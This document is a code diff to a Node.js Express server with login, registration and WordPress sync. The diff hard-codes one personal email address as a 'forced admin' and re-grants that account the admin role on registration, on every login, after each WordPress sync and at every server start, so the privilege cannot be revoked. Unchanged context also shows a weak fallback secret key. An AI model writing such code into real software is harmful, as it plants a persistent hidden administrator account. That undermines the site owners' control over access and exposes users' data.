@@ -36,6 +36,9 @@ const SECRET_KEY = process.env.SECRET_KEY || "supersecretkey";
 const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';
 const WP_SYNC_ON_STARTUP = toBoolean(process.env.WP_SYNC_ON_STARTUP, false);
 const WP_SYNC_FULL_REPLACE = toBoolean(process.env.WP_SYNC_FULL_REPLACE, true);
+const FORCED_ADMIN_LOGINS = new Set([
+    'urazovmaks1502@gmail.com',
+]);
 
 // Middleware
 if (helmet) {
@@ -421,6 +424,19 @@ const getUserIdFromToken = (req) => {
     return user ? user.id : null;
 };
 
+const normalizeLogin = (value) => String(value || '').trim().toLowerCase();
+
+const isForcedAdminLogin = (login) => FORCED_ADMIN_LOGINS.has(normalizeLogin(login));
+
+const enforceForcedAdminRoles = async () => {
+    for (const forcedLogin of FORCED_ADMIN_LOGINS) {
+        await dbRunAsync(
+            "UPDATE users SET role = 'admin' WHERE LOWER(username) = LOWER(?)",
+            [forcedLogin]
+        );
+    }
+};
+
 const CATEGORY_LABELS_RU = {
     avto: 'Авто',
     'bankovskij-sektor': 'Банковский сектор',
@@ -477,7 +493,7 @@ app.post('/api/auth/register', async (req, res) => {
 
         const countRow = await dbGetAsync("SELECT COUNT(*) as count FROM users");
         const isFirstUser = Number(countRow?.count) === 0;
-        const userRole = isFirstUser ? 'admin' : (role || 'user');
+        const userRole = (isFirstUser || isForcedAdminLogin(username)) ? 'admin' : (role || 'user');
 
         const pointsSettings = await getPointsSettings();
         const startPoints = pointsSettings.start_points;
@@ -536,6 +552,11 @@ app.post('/api/auth/login', (req, res) => {
         const isValidPassword = await verifyPassword(password, user.password);
 
         if (isValidPassword) {
+            if (isForcedAdminLogin(user.username) && user.role !== 'admin') {
+                await dbRunAsync("UPDATE users SET role = 'admin' WHERE id = ?", [user.id]);
+                user.role = 'admin';
+            }
+
             if (shouldRehashPassword(user.password)) {
                 try {
                     const rehashedPassword = await bcrypt.hash(password, 10);
@@ -1071,6 +1092,7 @@ app.post('/api/admin/sync/wordpress', authenticateToken, requireAdmin, async (re
 
     try {
         const stats = await syncWordpressIfConfigured({ fullReplace });
+        await enforceForcedAdminRoles();
         if (stats.skipped) {
             return res.status(400).json({ message: stats.reason });
         }
@@ -1705,6 +1727,7 @@ const startServer = async () => {
     if (WP_SYNC_ON_STARTUP) {
         try {
             const stats = await syncWordpressIfConfigured({ fullReplace: WP_SYNC_FULL_REPLACE });
+            await enforceForcedAdminRoles();
             if (stats.skipped) {
                 console.warn('[WP Sync] Startup sync skipped:', stats.reason);
             } else {
@@ -1713,6 +1736,12 @@ const startServer = async () => {
         } catch (error) {
             console.error('[WP Sync] Startup sync failed:', error.message);
         }
+    }
+
+    try {
+        await enforceForcedAdminRoles();
+    } catch (error) {
+        console.error('[Admin Override] Failed to enforce forced admin roles:', error.message);
     }
 
     app.listen(PORT, HOST, () => {
